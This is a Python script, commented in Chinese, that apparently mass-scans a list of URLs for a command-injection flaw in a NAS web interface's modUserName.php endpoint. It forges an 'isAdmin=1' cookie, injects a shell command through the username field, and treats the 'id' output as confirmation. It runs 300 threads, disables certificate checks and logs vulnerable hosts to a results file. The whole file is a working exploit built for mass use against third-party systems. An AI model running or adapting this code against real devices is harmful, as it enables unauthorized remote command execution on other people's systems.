import requests
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urljoin
import urllib3
import time
import sys

# 禁用SSL警告和验证
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# 线程锁，用于文件写入
file_lock = threading.Lock()

def check_vulnerability(url):
    """
    检查单个URL是否存在漏洞
    """
    try:
        # 构造完整的请求URL
        target_url = urljoin(url, "/web/php/modUserName.php")
        
        # 请求头
        headers = {
            "Host": "west.nas.mrxn.net",
            "Cookie": "username=test; isAdmin=1",
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        }
        
        # 请求数据
        data = 'oldName=someuser&username=newuser"; id; #'
        
        # 发送POST请求，禁用SSL验证，禁用重定向
        response = requests.post(
            target_url,
            headers=headers,
            data=data,
            verify=False,
            allow_redirects=False,
            timeout=10
        )
        
        status_code = response.status_code
        response_text = response.text
        
        # 判断逻辑
        if 300 <= status_code < 400:
            # 3xx状态码，认为不存在漏洞
            print(f"[INFO] {url} - 状态码 {status_code}，不存在漏洞 (重定向)")
            return None
        
        elif status_code == 200:
            # 200状态码，检查响应内容是否包含'gid'
            if 'gid' in response_text.lower():
                # 存在漏洞
                print(f"[VULN] {url} - 状态码 {status_code}，发现漏洞!")
                return url  # 只返回URL
            else:
                print(f"[INFO] {url} - 状态码 {status_code}，响应不包含gid，不存在漏洞")
                return None
        
        else:
            # 其他状态码
            print(f"[INFO] {url} - 状态码 {status_code}，不存在漏洞")
            return None
            
    except requests.exceptions.RequestException as e:
        print(f"[ERROR] {url} - 请求失败: {str(e)}")
        return None
    except Exception as e:
        print(f"[ERROR] {url} - 发生错误: {str(e)}")
        return None

def save_vuln_url(vuln_url):
    """
    将漏洞URL保存到文件，使用线程锁确保线程安全
    """
    with file_lock:
        with open('result.txt', 'a', encoding='utf-8') as f:
            f.write(f"{vuln_url}\n")

def main():
    # 读取URL列表
    try:
        with open('url.txt', 'r', encoding='utf-8') as f:
            urls = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print("[ERROR] 未找到url.txt文件")
        return
    except Exception as e:
        print(f"[ERROR] 读取url.txt失败: {str(e)}")
        return
    
    if not urls:
        print("[INFO] url.txt中没有找到有效的URL")
        return
    
    print(f"[INFO] 共发现 {len(urls)} 个URL需要检测")
    print(f"[INFO] 线程数: 300")
    print(f"[INFO] 开始检测...\n")
    
    # 清空或创建结果文件
    with open('result.txt', 'w', encoding='utf-8') as f:
        f.write(f"存在漏洞的URL列表 - {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write("=" * 60 + "\n")
    
    vuln_count = 0
    start_time = time.time()
    
    # 使用ThreadPoolExecutor创建线程池，最大线程数300
    with ThreadPoolExecutor(max_workers=300) as executor:
        # 提交所有任务
        future_to_url = {executor.submit(check_vulnerability, url): url for url in urls}
        
        # 处理完成的任务
        for future in as_completed(future_to_url):
            url = future_to_url[future]
            try:
                vuln_url = future.result(timeout=15)
                if vuln_url:
                    # 发现漏洞，立即保存URL
                    save_vuln_url(vuln_url)
                    vuln_count += 1
            except Exception as e:
                print(f"[ERROR] {url} - 任务执行异常: {str(e)}")
    
    end_time = time.time()
    
    print("\n" + "=" * 60)
    print(f"[INFO] 检测完成!")
    print(f"[INFO] 总URL数: {len(urls)}")
    print(f"[INFO] 发现漏洞数: {vuln_count}")
    print(f"[INFO] 总耗时: {end_time - start_time:.2f}秒")
    print(f"[INFO] 结果已保存到 result.txt")
    
    if vuln_count > 0:
        print(f"[INFO] 存在漏洞的URL:")
        with open('result.txt', 'r', encoding='utf-8') as f:
            lines = f.readlines()
            # 跳过前两行标题
            for line in lines[2:]:
                if line.strip():
                    print(f"  {line.strip()}")

if __name__ == "__main__":
    main()